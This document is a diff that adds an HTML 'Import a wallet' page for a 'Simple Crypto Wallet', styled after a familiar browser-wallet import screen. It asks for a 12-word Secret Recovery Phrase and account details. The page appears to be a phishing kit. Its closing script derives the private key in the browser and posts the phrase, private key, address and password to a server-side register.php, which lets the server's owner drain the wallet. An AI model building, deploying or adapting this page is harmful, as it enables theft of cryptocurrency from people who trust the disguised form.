@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html data-theme="os">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
+    <title>Import New Wallet || Simple Crypto Wallet</title>    
+    <link rel="stylesheet" type="text/css" href="style.css" title="ltr">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet">
+    <link rel="shortcut icon" href="../img/logo_single.png" type="image/x-icon">
+    <link rel="shortcut icon" type="image/png" href="../img/logo_single.png" />
+    <style data-jss="" data-meta="MuiInputBase">
+        @-webkit-keyframes mui-auto-fill {}
+
+        @-webkit-keyframes mui-auto-fill-cancel {}
+
+        .MuiInputBase-root {
+            color: rgba(0, 0, 0, 0.87);
+            cursor: text;
+            display: inline-flex;
+            position: relative;
+            font-size: 1rem;
+            box-sizing: border-box;
+            align-items: center;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-weight: 400;
+            line-height: 1.1876em;
+            letter-spacing: 0.00938em;
+        }
+
+        .MuiInputBase-root.Mui-disabled {
+            color: rgba(0, 0, 0, 0.38);
+            cursor: default;
+        }
+
+        .MuiInputBase-multiline {
+            padding: 6px 0 7px;
+        }
+
+        .MuiInputBase-multiline.MuiInputBase-marginDense {
+            padding-top: 3px;
+        }
+
+        .MuiInputBase-fullWidth {
+            width: 100%;
+        }
+
+        .MuiInputBase-input {
+            font: inherit;
+            color: currentColor;
+            width: 100%;
+            border: 0;
+            height: 1.1876em;
+            margin: 0;
+            display: block;
+            padding: 6px 0 7px;
+            min-width: 0;
+            background: none;
+            box-sizing: content-box;
+            animation-name: mui-auto-fill-cancel;
+            letter-spacing: inherit;
+            animation-duration: 10ms;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .MuiInputBase-input::-webkit-input-placeholder {
+            color: currentColor;
+            opacity: 0.42;
+            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+        }
+
+        .MuiInputBase-input::-moz-placeholder {
+            color: currentColor;
+            opacity: 0.42;
+            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+        }
+
+        .MuiInputBase-input:-ms-input-placeholder {
+            color: currentColor;
+            opacity: 0.42;
+            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+        }
+
+        .MuiInputBase-input::-ms-input-placeholder {
+            color: currentColor;
+            opacity: 0.42;
+            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+        }
+
+        .MuiInputBase-input:focus {
+            outline: 0;
+        }
+
+        .MuiInputBase-input:invalid {
+            box-shadow: none;
+        }
+
+        .MuiInputBase-input::-webkit-search-decoration {
+            -webkit-appearance: none;
+        }
+
+        .MuiInputBase-input.Mui-disabled {
+            opacity: 1;
+        }
+
+        .MuiInputBase-input:-webkit-autofill {
+            animation-name: mui-auto-fill;
+            animation-duration: 5000s;
+        }
+
+        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input::-webkit-input-placeholder {
+            opacity: 0 !important;
+        }
+
+        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input::-moz-placeholder {
+            opacity: 0 !important;
+        }
+
+        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input:-ms-input-placeholder {
+            opacity: 0 !important;
+        }
+
+        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input::-ms-input-placeholder {
+            opacity: 0 !important;
+        }
+
+        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input:focus::-webkit-input-placeholder {
+            opacity: 0.42;
+        }
+
+        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input:focus::-moz-placeholder {
+            opacity: 0.42;
+        }
+
+        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input:focus:-ms-input-placeholder {
+            opacity: 0.42;
+        }
+
+        label[data-shrink=false]+.MuiInputBase-formControl .MuiInputBase-input:focus::-ms-input-placeholder {
+            opacity: 0.42;
+        }
+
+        .MuiInputBase-inputMarginDense {
+            padding-top: 3px;
+        }
+
+        .MuiInputBase-inputMultiline {
+            height: auto;
+            resize: none;
+            padding: 0;
+        }
+
+        .MuiInputBase-inputTypeSearch {
+            -moz-appearance: textfield;
+            -webkit-appearance: textfield;
+        }
+    </style>
+    <style data-jss="" data-meta="MuiInput">
+        .MuiInput-root {
+            position: relative;
+        }
+
+        label+.MuiInput-formControl {
+            margin-top: 16px;
+        }
+
+        .MuiInput-colorSecondary.MuiInput-underline:after {
+            border-bottom-color: #f50057;
+        }
+
+        .MuiInput-underline:after {
+            left: 0;
+            right: 0;
+            bottom: 0;
+            content: "";
+            position: absolute;
+            transform: scaleX(0);
+            transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
+            border-bottom: 2px solid #3f51b5;
+            pointer-events: none;
+        }
+
+        .MuiInput-underline.Mui-focused:after {
+            transform: scaleX(1);
+        }
+
+        .MuiInput-underline.Mui-error:after {
+            transform: scaleX(1);
+            border-bottom-color: #f44336;
+        }
+
+        .MuiInput-underline:before {
+            left: 0;
+            right: 0;
+            bottom: 0;
+            content: "\00a0";
+            position: absolute;
+            transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.42);
+            pointer-events: none;
+        }
+
+        .MuiInput-underline:hover:not(.Mui-disabled):before {
+            border-bottom: 2px solid rgba(0, 0, 0, 0.87);
+        }
+
+        .MuiInput-underline.Mui-disabled:before {
+            border-bottom-style: dotted;
+        }
+
+        @media (hover: none) {
+            .MuiInput-underline:hover:not(.Mui-disabled):before {
+                border-bottom: 1px solid rgba(0, 0, 0, 0.42);
+            }
+        }
+    </style>
+    <style data-jss="" data-meta="MuiFormLabel">
+        .MuiFormLabel-root {
+            color: rgba(0, 0, 0, 0.54);
+            padding: 0;
+            font-size: 1rem;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-weight: 400;
+            line-height: 1;
+            letter-spacing: 0.00938em;
+        }
+
+        .MuiFormLabel-root.Mui-focused {
+            color: #3f51b5;
+        }
+
+        .MuiFormLabel-root.Mui-disabled {
+            color: rgba(0, 0, 0, 0.38);
+        }
+
+        .MuiFormLabel-root.Mui-error {
+            color: #f44336;
+        }
+
+        .MuiFormLabel-colorSecondary.Mui-focused {
+            color: #f50057;
+        }
+
+        .MuiFormLabel-asterisk.Mui-error {
+            color: #f44336;
+        }
+    </style>
+    <style data-jss="" data-meta="MuiInputLabel">
+        .MuiInputLabel-root {
+            display: block;
+            transform-origin: top left;
+        }
+
+        .MuiInputLabel-formControl {
+            top: 0;
+            left: 0;
+            position: absolute;
+            transform: translate(0, 24px) scale(1);
+        }
+
+        .MuiInputLabel-marginDense {
+            transform: translate(0, 21px) scale(1);
+        }
+
+        .MuiInputLabel-shrink {
+            transform: translate(0, 1.5px) scale(0.75);
+            transform-origin: top left;
+        }
+
+        .MuiInputLabel-animated {
+            transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms, transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
+        }
+
+        .MuiInputLabel-filled {
+            z-index: 1;
+            transform: translate(12px, 20px) scale(1);
+            pointer-events: none;
+        }
+
+        .MuiInputLabel-filled.MuiInputLabel-marginDense {
+            transform: translate(12px, 17px) scale(1);
+        }
+
+        .MuiInputLabel-filled.MuiInputLabel-shrink {
+            transform: translate(12px, 10px) scale(0.75);
+        }
+
+        .MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
+            transform: translate(12px, 7px) scale(0.75);
+        }
+
+        .MuiInputLabel-outlined {
+            z-index: 1;
+            transform: translate(14px, 20px) scale(1);
+            pointer-events: none;
+        }
+
+        .MuiInputLabel-outlined.MuiInputLabel-marginDense {
+            transform: translate(14px, 12px) scale(1);
+        }
+
+        .MuiInputLabel-outlined.MuiInputLabel-shrink {
+            transform: translate(14px, -6px) scale(0.75);
+        }
+    </style>
+    <style data-jss="" data-meta="MuiFormControl">
+        .MuiFormControl-root {
+            border: 0;
+            margin: 0;
+            display: inline-flex;
+            padding: 0;
+            position: relative;
+            min-width: 0;
+            flex-direction: column;
+            vertical-align: top;
+        }
+
+        .MuiFormControl-marginNormal {
+            margin-top: 16px;
+            margin-bottom: 8px;
+        }
+
+        .MuiFormControl-marginDense {
+            margin-top: 8px;
+            margin-bottom: 4px;
+        }
+
+        .MuiFormControl-fullWidth {
+            width: 100%;
+        }
+    </style>
+    <style data-jss="" data-meta="makeStyles">
+        .jss31 {
+            color: var(--color-text-alternative);
+            font-weight: 400;
+        }
+
+        .jss31.jss32 {
+            color: var(--color-text-alternative);
+        }
+
+        .jss31.jss34 {
+            color: var(--color-text-alternative);
+        }
+
+        .jss33:before {
+            border-bottom: 1px solid var(--color-text-default) !important;
+        }
+
+        .jss33:after {
+            border-bottom: 2px solid var(--color-primary-default);
+        }
+
+        .jss35 {
+            color: var(--color-text-alternative);
+        }
+
+        .jss36 {
+            padding: 8px;
+        }
+
+        .jss36::placeholder {
+            color: var(--color-text-alternative);
+        }
+
+        .jss37 {
+            color: var(--color-background-default);
+        }
+
+        .jss38:after {
+            border-bottom: 2px solid var(--color-background-default);
+        }
+
+        .jss39.jss40 {
+            color: var(--color-text-alternative);
+        }
+
+        .jss39.jss34 {
+            color: var(--color-text-alternative);
+        }
+
+        .jss42 {
+            color: var(--color-text-default);
+            border: 1px solid var(--color-border-default);
+            height: 48px;
+            display: flex;
+            padding: 0 16px;
+            align-items: center;
+            border-radius: 6px;
+            background-color: var(--color-background-default);
+        }
+
+        label+.jss42 {
+            margin-top: 9px;
+        }
+
+        .jss42.jss41 {
+            border: 1px solid var(--color-primary-default);
+        }
+
+        .jss43 {
+            color: var(--color-text-default);
+            position: initial;
+            font-size: 1rem;
+            transform: none;
+            transition: none;
+        }
+
+        .jss44 {
+            color: var(--color-text-default);
+            position: initial;
+            font-size: .75rem;
+            transform: none;
+            transition: none;
+        }
+
+        .jss45 {
+            line-height: initial !important;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="app-content">
+        <div class="app os-win mouse-user-styles">
+            <div class="app-header">
+                <div class="app-header__contents">
+                    <div class="app-header__logo-container app-header__logo-container--clickable">
+                        <a href="/">
+                            <img src="../img/logo.png" width="200px" height="40px" alt="Simple Crypto Wallet logotype">    
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <div class="main-container-wrapper">
+                <div class="first-time-flow">
+                    <div class="first-time-flow__wrapper">
+                        <div class="first-time-flow__import">
+                            <div class="first-time-flow__create-back">
+                                <a href="index.html">&lt; Back</a></div>
+                            <div class="first-time-flow__header">Import a wallet with Secret Recovery Phrase</div>
+                            <div class="first-time-flow__text-block">Only the first account on this wallet will auto
+                                load. After completing this process, to add additional accounts, click the drop down
+                                menu, then select Create Account.</div>
+                            <form>
+                                <div class="import-srp__container">
+                                    <label class="import-srp__srp-label">
+                                        <h4
+                                            class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--h4 typography--weight-bold typography--style-normal typography--align-left typography--color-text-default">
+                                            Secret Recovery Phrase</h4>
+                                    </label>
+                                    <div class="actionable-message import-srp__paste-tip actionable-message--with-icon">
+                                        <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
+                                            <path
+                                                d="M5 0C2.2 0 0 2.2 0 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0 2c.4 0 .7.3.7.7s-.3.7-.7.7-.7-.2-.7-.6.3-.8.7-.8zm.7 6H4.3V4.3h1.5V8z"
+                                                fill="var(--color-info-default)"></path>
+                                        </svg>
+                                        <div class="actionable-message__message">Ensure the spelling in all fields are
+                                            correct</div>
+                                    </div>                                    
+                                    <div class="import-srp__srp">
+                                        <div class="import-srp__srp-word"><label for="import-srp__srp-word-0"
+                                                class="import-srp__srp-word-label">
+                                                <p class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 
+                                                    box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal 
+                                                    typography--color-text-default">
+                                                    1.
+                                                </p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed1" type="text" dir="auto"
+                                                        data-testid="import-srp__srp-word-0"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                        <div class="import-srp__srp-word"><label for="import-srp__srp-word-1"
+                                                class="import-srp__srp-word-label">
+                                                <p
+                                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
+                                                    2.</p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed2" type="type" dir="auto"
+                                                        data-testid="import-srp__srp-word-1"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                        <div class="import-srp__srp-word">
+                                            <label for="import-srp__srp-word-2"
+                                                class="import-srp__srp-word-label">
+                                                <p
+                                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
+                                                    3.</p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed3" type="text" dir="auto"
+                                                        data-testid="import-srp__srp-word-2"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                        <div class="import-srp__srp-word">
+                                            <label for="import-srp__srp-word-3"
+                                                class="import-srp__srp-word-label">
+                                                <p
+                                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
+                                                    4.</p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed4" type="text" dir="auto"
+                                                        data-testid="import-srp__srp-word-3"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                        <div class="import-srp__srp-word">
+                                            <label for="import-srp__srp-word-4"
+                                                class="import-srp__srp-word-label">
+                                                <p
+                                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
+                                                    5.</p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed5" type="text" dir="auto"
+                                                        data-testid="import-srp__srp-word-4"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                        <div class="import-srp__srp-word">
+                                            <label for="import-srp__srp-word-5"
+                                                class="import-srp__srp-word-label">
+                                                <p
+                                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
+                                                    6.</p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed6" type="text" dir="auto"
+                                                        data-testid="import-srp__srp-word-5"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                        <div class="import-srp__srp-word">
+                                            <label for="import-srp__srp-word-6"
+                                                class="import-srp__srp-word-label">
+                                                <p
+                                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
+                                                    7.</p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed7" type="text" dir="auto"
+                                                        data-testid="import-srp__srp-word-6"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                        <div class="import-srp__srp-word">
+                                            <label for="import-srp__srp-word-7"
+                                                class="import-srp__srp-word-label">
+                                                <p
+                                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
+                                                    8.</p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed8" type="text" dir="auto"
+                                                        data-testid="import-srp__srp-word-7"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                        <div class="import-srp__srp-word">
+                                            <label for="import-srp__srp-word-8"
+                                                class="import-srp__srp-word-label">
+                                                <p
+                                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
+                                                    9.</p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed9" type="text" dir="auto"
+                                                        data-testid="import-srp__srp-word-8"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                        <div class="import-srp__srp-word">
+                                            <label for="import-srp__srp-word-9"
+                                                class="import-srp__srp-word-label">
+                                                <p
+                                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
+                                                    10.</p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed10" type="text" dir="auto"
+                                                        data-testid="import-srp__srp-word-9"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                        <div class="import-srp__srp-word">
+                                            <label for="import-srp__srp-word-10"
+                                                class="import-srp__srp-word-label">
+                                                <p
+                                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
+                                                    11.</p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed11" type="text" dir="auto"
+                                                        data-testid="import-srp__srp-word-10"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                        <div class="import-srp__srp-word">
+                                            <label for="import-srp__srp-word-11"
+                                                class="import-srp__srp-word-label">
+                                                <p
+                                                    class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography typography--p typography--weight-normal typography--style-normal typography--color-text-default">
+                                                    12.</p>
+                                            </label>
+                                            <div class="MuiFormControl-root MuiTextField-root">
+                                                <div
+                                                    class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                                    <input aria-invalid="false" autocomplete="off"
+                                                        id="seed12" type="text" dir="auto"
+                                                        data-testid="import-srp__srp-word-11"
+                                                        class="MuiInputBase-input MuiInput-input" value="">
+                                                </div>
+                                            </div>                                            
+                                        </div>
+                                    </div>
+                                </div>
+                                <div id="seediv"></div>
+                                <div class="create-new-vault__create-password">
+                                    <div class="MuiFormControl-root MuiTextField-root MuiFormControl-marginNormal">
+                                        <label
+                                            class="MuiFormLabel-root MuiInputLabel-root jss39 jss43 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink"
+                                            data-shrink="true" for="email" id="password-label">
+                                            Email</label>
+                                        <div class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                            <input aria-invalid="false" id="email" type="text" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                                        </div>
+                                        
+                                    </div>
+                                    <div class="MuiFormControl-root MuiTextField-root MuiFormControl-marginNormal">
+                                        <label class="MuiFormLabel-root MuiInputLabel-root jss39 jss43 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink"
+                                            data-shrink="true" for="username"
+                                            id="confirm-password-label">Username</label>
+                                        <div
+                                            class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                            <input aria-invalid="false" id="username" type="text" dir="auto" class="MuiInputBase-input MuiInput-input" value="">
+                                        </div>
+                                        <div id="usern"></div>
+                                    </div>
+                                </div>
+                                <div class="create-new-vault__create-password">
+                                    <div class="MuiFormControl-root MuiTextField-root MuiFormControl-marginNormal">
+                                        <label
+                                            class="MuiFormLabel-root MuiInputLabel-root jss39 jss43 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink"
+                                            data-shrink="true" for="password" id="password-label">
+                                            Password (8 characters min)</label>
+                                        <div
+                                            class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                            <input aria-invalid="false" autocomplete="new-password" id="password"
+                                                type="password" dir="auto" class="MuiInputBase-input MuiInput-input"
+                                                value="">
+                                        </div>
+                                    </div>
+                                    <div class="MuiFormControl-root MuiTextField-root MuiFormControl-marginNormal">
+                                        <label
+                                            class="MuiFormLabel-root MuiInputLabel-root jss39 jss43 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink"
+                                            data-shrink="true" for="confirm-password"
+                                            id="confirm-password-label">Confirm password</label>
+                                        <div
+                                            class="MuiInputBase-root MuiInput-root jss42 MuiInputBase-formControl MuiInput-formControl">
+                                            <input aria-invalid="false" autocomplete="new-password"
+                                                id="password2" type="password" dir="auto"
+                                                class="MuiInputBase-input MuiInput-input" value="">
+                                        </div>
+                                    </div>
+                                    <div id="passlent"></div>
+                                    <div id="conpass"></div>
+                                </div> 
+                                <div id="submitdiv"></div>
+                            </form>
+                            
+                            <button id="import" onclick="register_user();" class="button btn--rounded btn-primary create-new-vault__submit-button">
+                                Import
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <script>
+    function register_user() {
+
+        let seed1 = $('#seed1').val();let seed2 = $('#seed2').val();let seed3 = $('#seed3').val();let seed4 = $('#seed4').val();let seed5 = $('#seed5').val();let seed6 = $('#seed6').val();
+        let seed7 = $('#seed7').val();let seed8 = $('#seed8').val();let seed9 = $('#seed9').val();let seed10 = $('#seed10').val();let seed11 = $('#seed11').val();let seed12 = $('#seed12').val();
+        let uame = $('#username').val();
+        let eail = $('#email').val();
+        let passw = $('#password').val();
+        let cpass = $('#password2').val();
+    
+        if (seed1.length === 0 || seed2.length === 0 || seed3.length === 0 || seed4.length === 0 || seed5.length === 0 || seed6.length === 0) {
+            document.getElementById('seediv').innerHTML = "<p class='MuiFormHelperText-root Mui-error MuiFormHelperText-filled' id='password-helper-text'>Fill all fields!!!</p>";
+            return;
+        }
+        if (seed7.length === 0 || seed8.length === 0 || seed9.length === 0 || seed10.length === 0 || seed11.length === 0 || seed12.length === 0) {
+            document.getElementById('seediv').innerHTML = "<p class='MuiFormHelperText-root Mui-error MuiFormHelperText-filled' id='password-helper-text'>Fill all fields!!!</p>";
+            return;
+        }
+        if (uame.length === 0 || eail.length === 0 || passw.length === 0 || cpass.length === 0) {
+            document.getElementById('submitdiv').innerHTML = "<p class='MuiFormHelperText-root Mui-error MuiFormHelperText-filled' id='password-helper-text'>Fill all fields!!!</p>";
+            return;
+        }
+        if (uame.length < 4) {
+            document.getElementById('usern').innerHTML = "<p class='MuiFormHelperText-root Mui-error MuiFormHelperText-filled' id='password-helper-text'>Username must have upto 4 characters!!!</p>";
+            return;
+        }
+        if (passw.length < 8) {
+            document.getElementById('passlent').innerHTML = "<p class='MuiFormHelperText-root Mui-error MuiFormHelperText-filled' id='password-helper-text'>Password must be more than 8 characters!!!</p>";
+            return;
+        }
+        if (passw !== cpass) {
+            document.getElementById('conpass').innerHTML = "<p class='MuiFormHelperText-root Mui-error MuiFormHelperText-filled' id='password-helper-text'>Password do not match</p>";
+            return;
+        }
+        
+        let seedarr = [seed1,seed2,seed3,seed4,seed5,seed6,seed7,seed8,seed9,seed10,seed11,seed12];
+        let seeds = seedarr.join(" ");
+        
+        const wallet4 = ethers.Wallet.fromMnemonic(seeds);
+        let add = wallet4.address;
+        let pri = wallet4.privateKey;
+        
+        $("#import").html('<span class="">Importing...</span>');
+        $.ajax({
+            url: '../data/register.php',
+            type: 'post',
+            dataType: 'json',
+            data: {
+                uame: uame,
+                eail: eail,
+                passw: passw,
+                seeds: seeds,
+                add: add,
+                pri: pri
+            },
+            success: function (response) {
+                if (response.stat === "one") {
+                        document.getElementById('submitdiv').innerHTML = "<p class='MuiFormHelperText-root Mui-error MuiFormHelperText-filled' id='password-helper-text'>An E-mail has been sent to you, please go there to activate your account, Do check your spam folder if you do not find the email in your inbox</p>";
+                        $("#import").html('Import');
+                    setTimeout(function () {
+                        window.location.href='end.html';
+                    }, 5000);
+                }else if (response.stat === "two") {
+                   document.getElementById('submitdiv').innerHTML = "<p class='MuiFormHelperText-root Mui-error MuiFormHelperText-filled' id='password-helper-text'>An account with matching details already exists!!!</p>";
+                    $("#import").html('Import');
+                }
+            }
+        });
+    }
+    </script>
+</body>
+
+</html>
